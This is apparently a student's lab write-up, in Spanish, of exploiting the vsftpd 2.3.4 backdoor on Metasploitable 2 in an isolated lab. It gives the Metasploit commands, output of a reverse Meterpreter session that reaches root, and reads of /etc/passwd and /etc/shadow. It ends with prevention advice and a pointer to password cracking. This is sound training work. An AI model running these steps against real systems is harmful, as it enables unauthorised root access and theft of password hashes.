# Explotación de vsftpd 2.3.4 en Metasploitable 2 con Metasploit

**Entorno:** laboratorio propio (Kali Linux → Metasploitable 2) en una Red NAT de VirtualBox aislada
**Objetivo:** `10.0.2.3` (puerto 21, FTP)
**Vulnerabilidad:** CVE-2011-2523 — puerta trasera en vsftpd 2.3.4
**Categoría:** Explotación y post-explotación
**Fecha:** 19/11/2026

## Objetivo
Comprobar en la práctica el hallazgo de la Lección 03 (vsftpd 2.3.4 con puerta trasera)
y valorar el impacto real de la vulnerabilidad, no solo su existencia.

## Flujo seguido
```
sudo msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.3
exploit
```

## Incidencia durante la explotación
Al lanzar `exploit` la primera vez, Metasploit devolvió:
```
[-] 10.0.2.3:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
```
**Causa:** `msfconsole` conserva entre módulos el último `PAYLOAD` configurado durante la
sesión. Un payload de prueba anterior (uno que necesitaba `LHOST`) se había quedado fijado,
y el exploit no podía lanzarse sin esa variable.

**Solución:** en vez de perseguir el nombre exacto del payload por defecto, se configuró
`LHOST` con la IP de Kali:
```
set LHOST 10.0.2.15
exploit
```
Con eso, Metasploit abrió un **gestor de conexión reversa (reverse TCP handler)** y lanzó
el exploit correctamente.

## Resultado
```
[*] Started reverse TCP handler on 10.0.2.15:4444
[*] 10.0.2.3:21 - Running automatic check ("set AutoCheck false" to disable)
[+] 10.0.2.3:21 - The target appears to be vulnerable. vsFTPd 2.3.4 banner detected; backdoor may be present
[+] 10.0.2.3:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.3:52404)
```
Se obtuvo una **sesión de Meterpreter** en vez de una shell básica, al haberse quedado
configurado un payload de Meterpreter por la incidencia anterior.

## Confirmación del acceso
Desde `meterpreter >`:
```
getuid
sysinfo
```
Y, entrando en una shell del sistema con `shell`:
```bash
whoami   # root
id       # uid=0(root) gid=0(root)
hostname # metasploitable
```
Acceso confirmado **como root, de forma remota, sin usar ninguna credencial**.

## Post-explotación: impacto demostrado
Con acceso de root se pudo leer información que normalmente está protegida:
```bash
cat /etc/passwd   # lista de todos los usuarios del sistema
cat /etc/shadow   # hashes de las contraseñas de cada usuario, solo legible por root
```
Esto demuestra el impacto real: a partir de un fallo en un único servicio (FTP) se
consigue control total del sistema y acceso a las credenciales de todos los usuarios,
que en un escenario real podrían reutilizarse para entrar en otros sistemas.

## Por qué funciona la vulnerabilidad
vsftpd 2.3.4 llevaba un código malicioso insertado en su propio código fuente (el
servidor de descargas oficial fue comprometido entre junio y julio de 2011). Al conectar
por FTP usando como nombre de usuario una cadena que contiene `:)`, el servidor abre una
shell de administrador en el puerto 6200. Metasploit automatiza esta secuencia.

## Cómo se previene
- Descargar software siempre de fuentes oficiales y comprobar sumas de verificación (checksums).
- Mantener los servicios actualizados y parcheados: esta puerta trasera se detectó y
  corrigió en 2011.
- Monitorizar conexiones salientes inusuales: una shell de root abriéndose sola hacia una
  IP externa es una señal clara para un IDS/SIEM.
- No exponer servicios innecesarios a la red.
- Principio de mínimo privilegio: que los servicios no corran como root salvo necesidad real.

## Qué aprendí
Más allá del exploit en sí, aprendí que `msfconsole` conserva variables (como `PAYLOAD`)
entre módulos durante la sesión, y que eso puede dar errores confusos si no se controla.
También vi la diferencia entre una shell básica y una sesión de Meterpreter, con sus
propios comandos (`getuid`, `sysinfo`, `shell` para bajar a una shell real). Y sobre todo
entendí qué significa "demostrar el impacto" en una auditoría: no basta con decir que hay
una vulnerabilidad, hay que mostrar hasta dónde permite llegar, como leer los hashes de
todas las contraseñas del sistema.

## Siguiente paso
Trabajar con los hashes obtenidos de `/etc/shadow`: cracking de contraseñas con `john` o
`hashcat` (Lección 06).
